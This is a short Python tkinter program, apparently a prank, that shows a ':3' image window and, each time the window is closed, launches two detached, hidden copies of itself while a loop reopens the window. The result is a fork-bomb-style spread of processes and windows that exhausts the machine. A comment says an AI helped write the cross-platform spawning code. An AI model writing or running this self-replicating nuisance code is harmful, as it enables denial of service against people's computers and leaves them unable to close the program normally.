import os
import sys
import subprocess
import tkinter as tk

SCRIPT_PATH = os.path.abspath(__file__)
PYTHONW = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')

def subproc(target):
	subprocess.Popen(target, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_NO_WINDOW)

def resource_path(relative_path): # Required for image assets
    if getattr(sys, 'frozen', False):
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base, relative_path)

def start_fork():
	# Cross-compatibility code for linux was written with assists from Claude
	if os.name == 'nt':
		if getattr(sys, 'frozen', False):
			target = [sys.executable]
		elif os.path.exists('colonthree.exe'):
			target = ['colonthree.exe']
		else:
			target = [PYTHONW, SCRIPT_PATH]
		subproc(target)
		return
	subprocess.Popen([sys.executable, __file__], start_new_session=True)

def colon_three():
	def on_close():
		for _ in range(2):
			start_fork()
		ColonThree.destroy()

	while True: # <- Evil fucking line
		ColonThree = tk.Tk()

		ColonThree.geometry('225x225')
		ColonThree.resizable(False, False)
		ColonThree.title(':3')

		icon = tk.PhotoImage(file=resource_path('assets/colonthree.png'))
		colon_three_image = tk.PhotoImage(file=resource_path('assets/colonthree.png'))

		ColonThree.iconphoto(True, icon)
		colon_three_label = tk.Label(ColonThree, image=colon_three_image)
		colon_three_label.pack()

		ColonThree.protocol("WM_DELETE_WINDOW", on_close)
		ColonThree.mainloop()

if __name__ == '__main__':
	colon_three()